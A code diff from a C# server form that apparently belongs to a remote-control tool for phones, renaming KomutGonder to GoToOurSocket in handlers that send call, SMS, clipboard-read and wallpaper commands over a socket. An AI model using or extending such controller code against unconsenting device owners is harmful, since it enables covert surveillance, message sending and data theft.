@@ -49,7 +49,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("ARA", "[VERI]" + textBox1.Text + "[VERI][0x09]", sck);
+                    MainWindow.GoToOurSocket("ARA", "[VERI]" + textBox1.Text + "[VERI][0x09]", sck);
                 }
                 catch (Exception) { }
             }
@@ -61,7 +61,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("SMSGONDER", "[VERI]" + textBox2.Text + "=" + textBox3.Text + "=" + "[VERI][0x09]", sck);
+                    MainWindow.GoToOurSocket("SMSGONDER", "[VERI]" + textBox2.Text + "=" + textBox3.Text + "=" + "[VERI][0x09]", sck);
                 }
                 catch (Exception) { }
             }
@@ -73,7 +73,7 @@ namespace Server.Views
             {
                 try
                 {
-                    MainWindow.KomutGonder("PANOSET", "[VERI]" + textBox4.Text + "[VERI][0x09]", sck);
+                    MainWindow.GoToOurSocket("PANOSET", "[VERI]" + textBox4.Text + "[VERI][0x09]", sck);
                 }
                 catch (Exception) { }
             }
@@ -83,7 +83,7 @@ namespace Server.Views
         {
             try
             {
-                MainWindow.KomutGonder("PANOGET", "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("PANOGET", "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -93,7 +93,7 @@ namespace Server.Views
             try
             {
                 pictureBox1.Image = null; label4.Text = "...";
-                MainWindow.KomutGonder("WALLPAPERGET", "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("WALLPAPERGET", "[VERI][0x09]", sck);
             }
             catch (Exception) { }
         }
@@ -143,7 +143,7 @@ namespace Server.Views
             string value = "https://upload.wikimedia.org/wikipedia/tr/5/5a/%C4%B0stemi_Betil.jpg";
             if (InputBox("wallpaper link", "Link:", ref value) == DialogResult.OK)
             {
-                MainWindow.KomutGonder("WALLPAPERBYTE", "[VERI]" + value + "[VERI][0x09]", sck);
+                MainWindow.GoToOurSocket("WALLPAPERBYTE", "[VERI]" + value + "[VERI][0x09]", sck);
             }
         }
 
